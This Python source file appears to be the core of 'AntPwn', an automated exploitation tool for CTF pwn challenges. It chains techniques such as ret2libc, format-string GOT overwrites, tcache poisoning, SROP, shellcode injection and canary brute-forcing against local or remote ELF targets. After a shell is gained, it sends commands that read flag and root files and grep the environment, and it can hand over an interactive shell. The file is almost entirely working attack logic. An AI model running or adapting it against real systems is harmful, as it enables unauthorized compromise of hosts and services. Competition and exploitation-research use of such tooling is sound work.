"""AntPwn FSM: exploit state machine with fallback transitions
解题状态机: RECON -> DECOMPILE -> SCAN -> STRATEGY -> OFFSET(ACO) -> BUILD
            -> TEST -> VERIFY, 任一阶段失败自动回退换策略重试
"""
import re
import struct
import sys
import time

from . import color, histedit, i18n
from .aco import AntColony
from .debugger import Process
from .exploits import (ExploitContext, all_strategies, cyclic, cyclic_find,
                       p32, p64)
from .gadgets import GadgetFinder


class State:
    RECON = "recon"
    DECOMPILE = "decompile"
    SCAN = "scan"
    STRATEGY = "strategy"
    OFFSET = "offset"
    BUILD = "build"
    TEST = "test"
    VERIFY = "verify"
    DONE = "done"
    FAILED = "failed"


STATE_ORDER = [State.RECON, State.DECOMPILE, State.SCAN, State.STRATEGY,
               State.OFFSET, State.BUILD, State.TEST, State.VERIFY]

# common CTF flag shapes: flag{...}, CTF{...}, HTB{...}, picoCTF{...}, ...
FLAG_RE = re.compile(r"[A-Za-z0-9_]{2,32}\{[^\n{}]{1,200}\}")

# plugin registry: extra capability-DAG edges from the outside
_EDGE_PLUGINS = []


def register_technique(fn):
    """register fn(ctx) -> [Technique] to extend the capability DAG"""
    if fn not in _EDGE_PLUGINS:
        _EDGE_PLUGINS.append(fn)
    return fn


class Logger:
    def __init__(self, verbose=True):
        self.verbose = verbose
        self.records = []

    def log(self, state, msg, styled=None):
        plain = f"[{state:>10}] {msg}"
        self.records.append(plain)
        if self.verbose:
            tag = color.state(state, f"{state:>10}")
            print(f"[{tag}] {styled if styled is not None else msg}")

    def raw(self, msg):
        self.records.append(msg)
        if self.verbose:
            print(msg)


class FSM:
    def __init__(self, path, log=None, lang="zh", remote=None, keep_shell=False,
                 use_pheromone=True, libc_path=None):
        i18n.set_lang(lang)
        self.path = path
        self.remote = remote        # (host, port) when attacking a remote service
        self.use_pheromone = use_pheromone
        self.libc_path = libc_path
        self.keep_shell = keep_shell  # leave the shell open for interactive use
        self.log = log or Logger()
        self.state = State.RECON
        self.trace = []           # (state, event, next_state)
        self.report_data = {
            "path": path, "mitigations": {}, "functions": [], "findings": [],
            "strategies": [], "offset": None, "aco": [], "notes": [],
            "result": None, "steps": [], "flag": None, "shell_output": None,
            "remote": f"{remote[0]}:{remote[1]}" if remote else None,
        }

    # ------------------------------------------------------------------
    def transition(self, ev, ok):
        """deterministic transition table with fallback edges"""
        cur = self.state
        if ok:
            if cur in STATE_ORDER:
                nxt = STATE_ORDER[STATE_ORDER.index(cur) + 1] if cur != State.VERIFY else State.DONE
            else:
                nxt = State.DONE
        else:
            # fallback edges
            nxt = {State.DECOMPILE: State.SCAN,   # decompile fail -> still scan
                   State.SCAN: State.STRATEGY,
                   State.STRATEGY: State.STRATEGY,  # try next strategy
                   State.OFFSET: State.STRATEGY,
                   State.BUILD: State.STRATEGY,
                   State.TEST: State.STRATEGY,
                   State.VERIFY: State.STRATEGY}.get(cur, State.FAILED)
        self.trace.append((cur, ev, nxt))
        light = color.event(ok, f"{cur} --{ev}{'[ok]' if ok else '[x]'}--> {nxt}")
        self.log.log(i18n.t("state"), f"{cur} --{ev}{'[ok]' if ok else '[x]'}--> {nxt}",
                     styled=light)
        self.state = nxt
        return nxt

    # ------------------------------------------------------------------
    def run(self):
        from .elf import ELF
        from .scanner import Scanner

        # ---- RECON ----
        try:
            self.elf = ELF(self.path)
        except Exception as e:
            self.log.log(State.RECON, f"{i18n.t('not_pwn')}: {e}")
            self.report_data["result"] = "not_elf"
            return False
        m = self.report_data["mitigations"]
        m["arch"] = "i386" if getattr(self.elf, "bits", 64) == 32 else "x86-64"
        m["bits"] = getattr(self.elf, "bits", 64)
        m["word"] = 4 if m["bits"] == 32 else 8
        m["pie"] = self.elf.is_pie
        m["nx"] = self.elf.has_nx
        m["execstack"] = self.elf.has_execstack
        m["canary"] = self.elf.canary
        m["relro"] = self.elf.relro
        self.log.log(State.RECON, f"arch={m['arch']} PIE={m['pie']} NX={m['nx']} Canary={m['canary']} "
                                  f"RELRO={m['relro']} execstack={m['execstack']}")
        self.transition("recon", True)

        # ---- DECOMPILE ----
        try:
            self.scanner = Scanner(self.elf)
            fns = self.scanner.scan()
            for name, pf in self.scanner.funcs.items():
                self.report_data["functions"].append(
                    {"name": name, "addr": pf.addr,
                     "pseudo": None, "calls": pf.calls})
            self.log.log(State.DECOMPILE,
                         f"{i18n.t('decompile')}: {len(self.scanner.funcs)} functions")
            self.transition("decompile", True)
        except Exception as e:
            self.log.log(State.DECOMPILE, f"decompile partial failure: {e}")
            self.transition("decompile", False)

        # ---- SCAN ----
        for f in self.scanner.findings:
            self.report_data["findings"].append(
                {"kind": f.kind, "func": f.func, "addr": f.addr,
                 "detail": f.text, "score": f.score})
        for f in self.scanner.findings[:12]:
            self.log.log(State.SCAN, f"  {i18n.t('found')}: [{f.kind}] {f.func} @ {f.addr:#x} — {f.text}")
        self.transition("scan", True)

        # ---- STRATEGY (v1.2: ants walk the capability DAG) ----
        gadgets = GadgetFinder(self.elf)
        ctx = ExploitContext(self.elf, self.scanner, gadgets, self.log)
        ctx.remote = self.remote
        ctx.libc_path = self.libc_path
        self.ctx = ctx

        from .graph import Colony
        colony = Colony(self.build_edges(ctx), self.log, enabled=self.use_pheromone)
        trail, ok = colony.solve(ctx)
        self.report_data["strategies"] = [e.name for e, _ in (trail or [])]
        self.report_data["aco"] = colony.history if hasattr(colony, "history") else []
        self.report_data["pheromone"] = colony.edge_report(ctx)
        self.report_data["pheromone_enabled"] = self.use_pheromone
        if ok:
            self.state = State.VERIFY
            self.transition("verify", True)
            self.report_data["result"] = "pwned:dag"
            self.report_data["notes"] = ctx.notes
            self.log.log(State.VERIFY, i18n.t("shell_ok"), styled=color.good(i18n.t("shell_ok")))
            self._announce_flag()
            return True

        # ---- legacy linear fallback (safety net) ----
        tried = []
        strategies = [S(ctx) for S in all_strategies()]
        arch = "i386" if getattr(self.elf, "bits", 64) == 32 else "x86-64"
        arch_blocked = [s.name for s in strategies if not s.supported()]
        candidates = [s for s in strategies if s.supported() and s.feasible()]
        # order: specific before generic
        prio = {"fmt": 0, "heap": 1, "ret2text": 2, "leaked_win": 2, "pivot": 3, "srop": 4,
                "ret2libc": 5, "one_gadget": 5, "ret2csu": 6, "ret2dlresolve": 6,
                "ret2syscall": 6, "shellcode": 7, "canary_brute": 8,
                "offbynull": 9}
        candidates.sort(key=lambda s: prio.get(s.name, 9))
        self.log.log(State.STRATEGY,
                     f"feasible strategies: {[s.name for s in candidates] or 'none'}",
                     styled=color.info(f"feasible strategies: "
                                       f"{color.style([s.name for s in candidates] or 'none', 'bold')}"))
        self.report_data["strategies"] = [s.name for s in candidates]
        if arch_blocked:
            self.log.log(State.STRATEGY,
                         f"{arch}: 仅 64 位实现（暂不支持）: {', '.join(arch_blocked)}",
                         styled=color.warn(
                             f"{arch}: 64-bit only (not supported on this arch): "
                             f"{', '.join(arch_blocked)}"))
        if not candidates:
            self._explain_no_strategy()

        for strat in candidates:
            if getattr(ctx, "expired", lambda: False)():
                ctx.note(
                    "总时限 ANTPWN_MAX_SECONDS 已到，停止后续策略",
                    "global time budget ANTPWN_MAX_SECONDS exhausted; stopping strategies")
                break
            self.state = State.STRATEGY
            tried.append(strat.name)
            self.log.log(State.STRATEGY, f"==> {i18n.t(strat.key)}",
                         styled=color.style(f"==> {i18n.t(strat.key)}", "bold", "bright_cyan"))
            self.report_data["steps"].append(f"strategy: {strat.name}")
            # ---- OFFSET via ACO (stack strategies only) ----
            if strat.name in ("ret2text", "leaked_win", "partial_pie", "ret2libc",
                              "ret2syscall", "ret2dlresolve", "one_gadget",
                              "ret2csu", "shellcode", "srop", "pivot"):
                if ctx.offset is None:
                    ok = self.find_offset(strat)
                    if not ok:
                        self.transition("offset", False)
                        continue
                self.transition("offset", True)
            # ---- BUILD + TEST + VERIFY ----
            self.transition("build", True)
            try:
                ok = strat.run()
            except Exception as e:
                import traceback
                self.log.raw(f"    ! exploit error: {e}")
                self.log.raw("      " + traceback.format_exc().replace("\n", "\n      ").rstrip())
                ok = False
            self.transition("test", ok)
            if ok:
                self.state = State.VERIFY
                self.transition("verify", True)
                self.report_data["result"] = f"pwned:{strat.name}"
                self.report_data["notes"] = ctx.notes
                self.log.log(State.VERIFY, i18n.t("shell_ok"), styled=color.good(i18n.t("shell_ok")))
                self._announce_flag()
                return True
            else:
                self.log.raw(f"    [x] {i18n.t('failed')} (strategy={strat.name})")
                ctx.offset = None  # offset may differ per strategy
        self.state = State.FAILED
        already = ctx.live.get("diagnosed", set())
        cues = ("不可行", "无法", "缺少", "缺 gadget", "缺少可用", "失败", "不支持", "拒绝")
        for zh, en in ctx.notes[-6:]:
            if zh in already:
                continue
            low = (zh + " " + en).lower()
            if not (any(c in zh for c in cues) or any(c in low for c in
                       ("cannot", "not exploitable", "no usable", "missing",
                        "refusing"))):
                continue
            msg = zh if i18n.LANG == "zh" else en
            self.log.raw("    诊断: " + msg)
            already.add(zh)
        self.report_data["result"] = "failed"
        self.report_data["notes"] = ctx.notes
        self.report_data["tried"] = tried
        return False

    # ------------------------------------------------------------------
    def _grab_flag(self):
        """read the flag (or whatever the shell can see) through the live shell"""
        tube = (self.ctx.live.get("shell_tube")
                if getattr(self, "ctx", None) else None)
        if tube is None:
            return None
        cmds = [
            b"id; pwd",
            b"ls -la 2>/dev/null",
            b"cat flag 2>/dev/null; cat flag.txt 2>/dev/null; "
            b"cat ./flag 2>/dev/null; cat /flag 2>/dev/null; "
            b"cat /flag.txt 2>/dev/null; cat /root/flag* 2>/dev/null; "
            b"cat /home/*/flag* 2>/dev/null; env 2>/dev/null | grep -i flag",
        ]
        out = b""
        try:
            for c in cmds:
                tube.sendline(c)
                time.sleep(0.15)
                out += tube.recv(0.4)
        except (BrokenPipeError, OSError):
            pass
        text = out.decode("utf-8", "replace")
        flag = None
        for line in text.splitlines():
            m = FLAG_RE.search(line)
            if m:
                flag = m.group(0)
                break
        self.report_data["shell_output"] = text.strip()
        self.report_data["flag"] = flag
        return flag

    # ------------------------------------------------------------------
    def _announce_flag(self):
        flag = self._grab_flag()
        tube = (self.ctx.live.get("shell_tube")
                if getattr(self, "ctx", None) else None)
        if flag:
            msg = f"{i18n.t('flag_found')}: {flag}"
            self.log.raw(color.good(msg))
            self.report_data["steps"].append(f"flag: {flag}")
        else:
            self.log.raw(color.dim(i18n.t("flag_not_found")))
            out = (self.report_data.get("shell_output") or "").strip()
            for line in out.splitlines()[:6]:
                self.log.raw(color.dim("  " + line))
            if len(out.splitlines()) > 6:
                self.log.raw(color.dim(f"  ... ({len(out.splitlines())} lines)"))
        if tube is not None and not self.keep_shell:
            tube.close()

    # ------------------------------------------------------------------
    def interactive(self):
        """hand the live shell to the user (stdin lines -> target, output back)"""
        tube = (self.ctx.live.get("shell_tube")
                if getattr(self, "ctx", None) else None)
        if tube is None:
            self.log.raw(color.warn("no live shell to interact with"))
            return
        where = f"{self.remote[0]}:{self.remote[1]}" if self.remote else self.path
        print(color.section(f"\n== interactive shell @ {where} =="))
        print(color.dim("send commands line by line, 'exit'/'quit' or Ctrl-D to leave\n"))
        histedit.setup()
        prompt = "shell> " if (sys.stdin is not None and getattr(sys.stdin, "isatty", lambda: False)()) else ""
        try:
            while True:
                line = histedit.read_line(prompt)
                if not line:
                    break
                cmd = line.rstrip("\n")
                if cmd.strip() in ("exit", "quit"):
                    break
                try:
                    tube.sendline(cmd)
                except (BrokenPipeError, OSError):
                    print(color.err("shell is gone"))
                    break
                time.sleep(0.1)
                out = tube.recv(0.5)
                if out:
                    sys.stdout.write(out.decode("utf-8", "replace"))
                    sys.stdout.flush()
        finally:
            histedit.save()
        tube.close()

    # ------------------------------------------------------------------
    def dt_find_offset(self, preamble=b""):
        """decision-tree offset inference: crash once, decode the cyclic
        pattern from forensic registers, then VERIFY each candidate with a
        marker probe (stack data copies can mimic the pattern).
        `preamble` models multi-read programs: bytes consumed before the
        overflowing read (the offset is preamble-relative)."""
        proc = None
        cands = []
        width = 4 if getattr(self.elf, "bits", 64) == 32 else 8
        try:
            proc = Process(self.path)
            proc.start()
            proc.send(preamble + cyclic(0x400) + b"\n")
            proc.close_stdin()
            ev = proc.cont(timeout=1.5)
            if ev[0] not in ("stop", "trap"):
                return None                      # branch: no crash at all
            regs = proc.getregs()

            # branch 1: rip itself carries the pattern -> exact offset
            off = cyclic_find(regs.rip, width=width)
            if off is not None and off < 0x100000:
                cands.append(off)
            # branch 2: saved frame pointer smashed -> return address after it
            off = cyclic_find(regs.rbp, width=width)
            if off is not None and off < 0x100000:
                cands.append(off + width)
            # branch 3: scan stack for the smashed return slot (weakest
            # evidence: stack may hold COPIES of our data, not the slot)
            try:
                stack = proc.read_mem(regs.rsp, 128)
                for i in range(0, len(stack) - width + 1, width):
                    j = cyclic_find(stack[i:i + width], width=width)
                    if j is not None and j < 0x100000:
                        cands.append(j)
            except Exception:
                pass
            proc.kill()
        except Exception as exc:
            if proc:
                try:
                    proc.kill()
                except Exception:
                    pass
            try:
                self.log.log(State.OFFSET, f"动态取证不可用: {exc}",
                             styled=color.warn(f"dynamic forensics unavailable: {exc}"))
            except Exception:
                pass
        # verification probes: a true offset puts a marker into RIP
        marker = 0xBEEFCAFE
        for cand in dict.fromkeys(cands):
            if self.crash_score(cand, marker, preamble) >= 1.0:
                return cand
        return None                # undecidable -> caller falls back to ACO

    # ------------------------------------------------------------------
    def build_edges(self, ctx):
        """wire the capability DAG: techniques are edges, strategies become
        single-shot or staged edge executors"""
        from .exploits import (Ret2Text, LeakedWin, PartialPIE, Ret2Libc, Ret2Syscall, FmtGOT,
                               Shellcode, SROP, StackPivot, HeapUAF,
                               Ret2OneGadget, Ret2CsuOneGadget, Ret2Dlresolve,
                               CanaryBrute, OffByNull)
        from .graph import (Technique, CAP_RIP, CAP_LIBC, CAP_FMTK,
                            CAP_HEAP, CAP_SHELL, SESSION, PROCESS)
        fsm = self
        r2l, fmt, heap = Ret2Libc(ctx), FmtGOT(ctx), HeapUAF(ctx)

        class _Dummy:
            probe_preamble = staticmethod(lambda: b"")

        def _preambles():
            """input-stream variants: bytes consumed before the overflowing
            read differ per technique (multi-read programs)"""
            variants = [b""]
            for S in (StackPivot,):
                try:
                    p = S(ctx).probe_preamble()
                except Exception:
                    p = b""
                if p and p not in variants:
                    variants.append(p)
            return variants

        def t_offset(c):
            # decision-tree forensics per input-stream variant; offsets are
            # stored per preamble so each edge uses its own semantics
            found = {}
            for pre in _preambles():
                off = fsm.dt_find_offset(pre)
                if off is not None:
                    found[pre] = off
                    fsm.log.log(State.OFFSET,
                                f"决策树取证 (preamble={len(pre)}B): 偏移 = {off}")
            if found:
                c.offsets_map.update(found)   # session knowledge: survives ants
                c.offset = found.get(b"", next(iter(found.values())))
                return True
            return fsm.find_offset(_Dummy())   # ACO fallback (noisy cases)

        _pv = StackPivot(ctx)

        def _pv_pre():
            try:
                p = _pv.probe_preamble()
            except Exception:
                p = b""
            return p if p else None

        def t_fmt_k(c):
            if c.fmt_k:
                return True
            k = fmt.find_k()
            if k:
                c.fmt_k = k
            return bool(k)

        def t_fmt_backdoor(c):
            gm = c.elf.got_map()
            win = c.backdoor_addr()
            if win is None or "printf" not in gm:
                return False
            return fmt._run_backdoor(c.fmt_k, gm["printf"], win)

        def t_fmt_leak(c):
            return fmt.stage_leak_libc(c.fmt_k, c.elf.got_map())

        def t_fmt_pwn(c):
            return fmt.stage_pwn_libc(c.fmt_k, c.elf.got_map())

        def _relro_open(c):
            return c.elf.relro != "full"

        edges = [
            Technique("dt-offset", [], [CAP_RIP], t_offset,
                      feasible=lambda c: "bof" in c.vuln_kinds, scope=SESSION,
                      prio=0, zh="崩溃取证推断偏移 (ACO 兜底)",
                      en="crash forensics infers the offset (ACO fallback)"),
            Technique("ret2text", [CAP_RIP], [CAP_SHELL], lambda c, _s=Ret2Text(ctx): _s.run(),
                      feasible=lambda c, _s=Ret2Text(ctx): _s.supported()
                      and "backdoor" in c.vuln_kinds
                      and not c.elf.is_pie and not c.elf.canary,
                      prio=1, zh="跳转到程序自带后门函数",
                      en="jump to the binary's own backdoor"),
            Technique("leaked-win", [CAP_RIP], [CAP_SHELL],
                      lambda c, _s=LeakedWin(ctx): _s.run(),
                      feasible=lambda c, _s=LeakedWin(ctx): _s.supported() and _s.feasible(),
                      prio=2, zh="用程序打印的 win 地址绕 PIE",
                      en="use the printed win address to bypass PIE"),
            Technique("partial-pie", [CAP_RIP], [CAP_SHELL],
                      lambda c, _s=PartialPIE(ctx): _s.run(),
                      feasible=lambda c, _s=PartialPIE(ctx): _s.supported() and _s.feasible(),
                      prio=2, zh="PIE 无泄露时部分覆盖返回地址低字节",
                      en="partial low-byte overwrite when PIE has no leak"),
            Technique("heap-leak", [], [CAP_HEAP], lambda c: heap.stage_heap_leak(),
                      feasible=lambda c, _s=heap: _s.supported() and "heap" in c.vuln_kinds,
                      scope=PROCESS,
                      prio=2, zh="UAF 双读推出精确堆地址",
                      en="two UAF reads recover exact heap addresses"),
            Technique("heap-forge", [CAP_HEAP], [CAP_LIBC], lambda c: heap.stage_forge(),
                      scope=PROCESS, prio=2,
                      zh="tcache poisoning 伪造槽位 -> 泄露 libc",
                      en="tcache poisoning forges a slot -> libc leak"),
            Technique("heap-pwn", [CAP_HEAP, CAP_LIBC], [CAP_SHELL],
                      lambda c: heap.stage_trigger(), prio=2,
                      zh="free@GOT 改 system 并触发",
                      en="rewrite free@GOT to system and trigger"),
            Technique("fmt-k", [], [CAP_FMTK], t_fmt_k,
                      feasible=lambda c, _s=fmt: _s.supported() and "fmt" in c.vuln_kinds,
                      scope=SESSION,
                      prio=0, zh="%p 喷射定位缓冲区参数位置",
                      en="%p spray locates the buffer's vararg index"),
            Technique("fmt-backdoor", [CAP_FMTK], [CAP_SHELL], t_fmt_backdoor,
                      feasible=lambda c, _s=fmt: _s.supported() and "fmt" in c.vuln_kinds
                      and "backdoor" in c.vuln_kinds and _relro_open(c),
                      prio=1, zh="%hn 把 printf@GOT 改成后门",
                      en="%hn points printf@GOT at the backdoor"),
            Technique("fmt-leak", [CAP_FMTK], [CAP_LIBC], t_fmt_leak,
                      feasible=lambda c, _s=fmt: _s.supported() and "fmt" in c.vuln_kinds
                      and _relro_open(c) and c.has_leak_function,
                      scope=PROCESS, prio=3,
                      zh="%k$s 泄露 GOT 里的 libc 地址",
                      en="%k$s leaks a libc pointer from the GOT"),
            Technique("fmt-pwn", [CAP_FMTK, CAP_LIBC], [CAP_SHELL], t_fmt_pwn,
                      prio=3, zh="printf@GOT 改 system, 输入 /bin/sh 触发",
                      en="printf@GOT -> system; '/bin/sh' input triggers it"),
            Technique("pivot", [CAP_RIP], [CAP_SHELL], lambda c, _s=_pv: _s.run(),
                      feasible=lambda c, _f=_pv.feasible, _s=_pv: _s.supported() and _f(), prio=4,
                      zh="栈迁移到可写段再 ROP",
                      en="stack pivot into a writable segment, then ROP",
                      preamble=_pv_pre()),
            Technique("srop", [CAP_RIP], [CAP_SHELL], lambda c, _s=SROP(ctx): _s.run(),
                      feasible=lambda c, _s=SROP(ctx): _s.supported() and _s.feasible(), prio=5,
                      zh="伪造信号帧 SROP 直接 execve",
                      en="forge a signal frame; SROP execve"),
            Technique("libc-leak", [CAP_RIP], [CAP_LIBC], lambda c: r2l.stage_leak(),
                      feasible=lambda c, _s=r2l: _s.supported() and "bof" in c.vuln_kinds
                      and not c.elf.is_pie and not c.elf.canary
                      and (c.bits == 32 or c.has_rop_gadgets)
                      and bool(c.elf.sym("puts"))
                      and bool(c.elf.sym("read")),
                      scope=PROCESS, prio=5,
                      zh="ROP 调 puts 泄露 libc 基址",
                      en="ROP into puts to leak the libc base"),
            Technique("libc-pwn", [CAP_LIBC, CAP_RIP], [CAP_SHELL],
                      lambda c: r2l.stage_pwn(), prio=5,
                      zh="system(\"/bin/sh\") 二次返回 getshell",
                      en="system(\"/bin/sh\") on the second return"),
            Technique("syscall", [CAP_RIP], [CAP_SHELL], lambda c, _s=Ret2Syscall(ctx): _s.run(),
                      feasible=lambda c, _s=Ret2Syscall(ctx): _s.supported() and _s.feasible(), prio=6,
                      zh="纯 ROP 链 syscall execve",
                      en="pure ROP chain syscall execve"),
            Technique("shellcode", [CAP_RIP], [CAP_SHELL], lambda c, _s=Shellcode(ctx): _s.run(),
                      feasible=lambda c, _s=Shellcode(ctx): _s.supported() and _s.feasible(), prio=7,
                      zh="可执行栈注入 shellcode",
                      en="inject shellcode on the exec stack"),
            Technique("one_gadget", [CAP_RIP], [CAP_SHELL],
                      lambda c, _s=Ret2OneGadget(ctx): _s.run(),
                      feasible=lambda c, _s=Ret2OneGadget(ctx): _s.supported() and _s.feasible(),
                      prio=8, zh="泄露 libc 后跳 one_gadget",
                      en="leak libc, jump to a one_gadget"),
            Technique("ret2csu", [CAP_RIP], [CAP_SHELL],
                      lambda c, _s=Ret2CsuOneGadget(ctx): _s.run(),
                      feasible=lambda c, _s=Ret2CsuOneGadget(ctx): _s.supported() and _s.feasible(),
                      prio=8, zh="__libc_csu_init 链泄露 + one_gadget",
                      en="csu-based leak + one_gadget"),
            Technique("dlresolve", [CAP_RIP], [CAP_SHELL],
                      lambda c, _s=Ret2Dlresolve(ctx): _s.run(),
                      feasible=lambda c, _s=Ret2Dlresolve(ctx): _s.supported() and _s.feasible(),
                      prio=8, zh="ret2dlresolve 解析 system",
                      en="ret2dlresolve resolves system"),
            Technique("offbynull", [], [CAP_SHELL],
                      lambda c, _s=OffByNull(ctx): _s.run(),
                      feasible=lambda c, _s=OffByNull(ctx): _s.supported() and _s.feasible(),
                      prio=9, zh="off-by-null 栈重叠跳后门",
                      en="off-by-null stack overlap to the win function"),
            Technique("canary-brute", [], [CAP_SHELL],
                      lambda c, _s=CanaryBrute(ctx): _s.run(),
                      feasible=lambda c, _s=CanaryBrute(ctx): _s.feasible(),
                      prio=9, zh="远程 fork 服务逐字节爆破 canary",
                      en="byte-wise canary brute on a fork server"),
        ]
        for fn in _EDGE_PLUGINS:
            try:
                extra = fn(ctx) or []
                edges = edges + list(extra)
            except Exception:
                continue
        return edges

    # ------------------------------------------------------------------
    def _explain_no_strategy(self):
        if getattr(self.elf, "bits", 64) == 32:
            self.log.log(State.STRATEGY,
                         "32 位可用路线: ret2text / ret2syscall(int 0x80) / "
                         "shellcode / ret2libc(cdecl)；fmt/heap/SROP/pivot 仅 64 位",
                         styled=color.warn(
                             "i386 routes: ret2text / ret2syscall(int 0x80) / "
                             "shellcode / ret2libc(cdecl); fmt/heap/SROP/pivot are 64-bit only"))
        """beginner-friendly diagnosis: why is nothing feasible?"""
        zh, en = [], []
        g = self.ctx.gadgets.find_all()
        gm = self.elf.got_map()
        kinds = {f.kind for f in self.scanner.findings}
        if "bof" not in kinds and "fmt" not in kinds and "heap" not in kinds:
            zh.append("没有发现内存破坏类漏洞 (溢出/格式化字符串/UAF)")
            en.append("no memory-corruption bug found (overflow / fmt / UAF)")
        if self.elf.is_pie:
            zh.append("开了 PIE: 地址随机化, 需要先泄露程序基址才有得打")
            en.append("PIE is on: need a program-base leak first")
        if self.elf.canary and "bof" in kinds:
            zh.append("开了 Canary: 栈溢出需先泄露/绕过 canary")
            en.append("Canary is on: overflow needs a canary leak/bypass")
        if "bof" in kinds and not self.elf.is_pie and not self.elf.canary:
            if "pop rdi" not in g:
                zh.append("二进制里没有 pop rdi 这类 gadget, 无法构造 ROP 链 "
                          "(真实比赛通常会在题里留下 gadget)")
                en.append("no 'pop rdi'-style gadget in the binary; ROP chain "
                          "cannot be built (real CTFs usually leave gadgets)")
            if "backdoor" not in kinds and "sh_string" not in kinds:
                zh.append("没有后门函数和 /bin/sh 字符串, 只有 ret2libc 一条路, "
                          "而它需要 puts/printf 等输出函数做泄露")
                en.append("no backdoor or /bin/sh string; ret2libc is the only "
                          "route and needs an output function to leak")
        if not gm:
            zh.append("程序不使用动态库符号 (静态或极简), 无法走 GOT 泄露")
            en.append("no dynamic symbols (static/minimal binary); GOT leak unavailable")
        if not zh:
            zh.append("漏洞组合暂不支持自动利用, 查看报告细节")
            en.append("this bug combination is not auto-exploitable yet; see report")
        for a, b in zip(zh, en):
            self.ctx.note(a, b)
            self.log.log(State.STRATEGY, f"  ? {a if i18n.LANG == 'zh' else b}")

    # ------------------------------------------------------------------
    def find_offset(self, strat):
        """ACO-driven dynamic offset search: ants probe offsets, fitness =
        degree of RIP control measured via ptrace crash analysis"""
        marker = 0xBEEFCAFE  # canonical (<2^48, bit47=0), no 0x0a bytes
        # ---- crashability pre-check: a long junk payload must disturb RIP ----
        pre = getattr(strat, "probe_preamble", lambda: b"")()
        probe = self.crash_score(24, marker, pre)
        long_probe = self._crash_long(pre)
        if probe == 0.0 and not long_probe:
            self.log.log(State.OFFSET,
                         "长 payload 也不会崩溃: 程序疑似无栈溢出, 跳过偏移搜索")
            return False
        base_guess = self.static_buf_estimate()
        if base_guess:
            lo, hi = max(8, base_guess - 40), base_guess + 120
        else:
            lo, hi = 8, 264
        step = 4 if getattr(self.elf, "bits", 64) == 32 else 8
        dims = [list(range(lo, hi, step))]
        self.log.log(State.OFFSET,
                     f"ant colony searching offset in [{lo},{hi}) "
                     f"(static hint: buf~{base_guess})")

        def fitness(vals):
            off = vals[0]
            # strategy may provide a preamble (multi-read programs)
            pre = getattr(strat, "probe_preamble", lambda: b"")()
            return self.crash_score(off, marker, pre)

        colony = AntColony(dims, fitness, ants=12, iters=8, seed=1337)
        best, score = colony.run(
            on_iter=lambda it, k, vals, s: self.log.log(
                State.OFFSET,
                f"  iter{it} ant{k}: off={vals[0] if vals else '-'} score={s:.2f}")
            if k >= 0 else None)
        self.report_data["aco"] = colony.history
        if best and score >= 1.0:
            self.ctx.offset = best[0]
            self.log.log(State.OFFSET,
                         f"{i18n.t('ants_converged')}: {i18n.t('offset_found')} = {best[0]}")
            return True
        if best and score > 0:
            self.ctx.offset = best[0]
            self.log.log(State.OFFSET, f"best partial control at {best[0]} (score {score:.2f})")
            return score >= 0.99
        return False

    def _crash_long(self, preamble=b""):
        """does a 300-byte junk payload crash the program at all?"""
        try:
            proc = Process(self.path)
            proc.start()
            proc.send(preamble + b"J" * 300 + b"\n")
            proc.close_stdin()
            ev = proc.cont(timeout=1.2)
            proc.kill()
        except Exception:
            return False
        return ev[0] in ("stop", "killed")

    def crash_score(self, off, marker, preamble=b""):
        """run target under ptrace with cyclic+marker payload; return control score"""
        proc = None
        try:
            proc = Process(self.path)
            proc.start()
            width = 4 if getattr(self.elf, "bits", 64) == 32 else 8
            pack = p32 if width == 4 else p64
            payload = preamble + cyclic(off) + pack(marker) + b"\n"
            proc.send(payload)
            proc.close_stdin()  # EOF: blocked reads return instead of hanging
            ev = proc.cont(timeout=1.5)
            regs = proc.getregs()
            proc.kill()
        except Exception:
            if proc:
                proc.kill()
            return 0.0
        if ev[0] not in ("stop", "trap"):
            return 0.0
        if regs.rip == marker:
            return 1.0
        # partial credit: marker appears in any register or on stack near rsp
        regvals = []
        for name in ("rdi", "rsi", "rdx", "rax", "rcx", "rbp",
                     "edi", "esi", "edx", "eax", "ecx", "ebp"):
            try:
                regvals.append(int(getattr(regs, name)) & 0xFFFFFFFFFFFFFFFF)
            except AttributeError:
                pass
        if marker in regvals:
            return 0.6
        return 0.0

    def static_buf_estimate(self):
        """generic buf-size hint from disassembly: prefer the function that
        contains the overflow finding (any name), else any function; use
        `sub rsp, N` or the widest [rbp-N] reference"""
        from .disasm import Disasm
        # rank functions: overflow-function first, then everything else
        bof = self.ctx.bof_finding() if self.ctx else None
        funcs = sorted(self.elf.code_symbols(), key=lambda s: 0 if (bof and s.name == bof.func) else 1)
        for sym in funcs:
            if not sym.value or (sym.size == 0 and sym.name != (bof.func if bof else "")):
                continue
            code = self.elf.read(sym.value, sym.size or 0x100)
            if not code:
                continue
            dis = Disasm(code, sym.value, self.elf.bits)
            sub_rsp = None
            max_rbp = 0
            for ins in dis.linear(len(code)):
                if ins.mnem == "sub" and len(ins.ops) == 2 and ins.ops[0] in ("rsp", "esp"):
                    try:
                        n = int(ins.ops[1], 16)
                        if 0 < n < 0x400:
                            sub_rsp = n
                    except ValueError:
                        pass
                for op in ins.ops:
                    for fp in ("rbp-0x", "ebp-0x"):
                        if fp in op:
                            try:
                                n = int(op.split(fp)[1].rstrip("]"), 16)
                                max_rbp = max(max_rbp, n)
                            except ValueError:
                                pass
            hint = sub_rsp or (max_rbp if max_rbp else None)
            if hint and 8 <= hint <= 0x400:
                word = 4 if getattr(self.elf, "bits", 64) == 32 else 8
                return hint + word  # + saved frame pointer
        return None
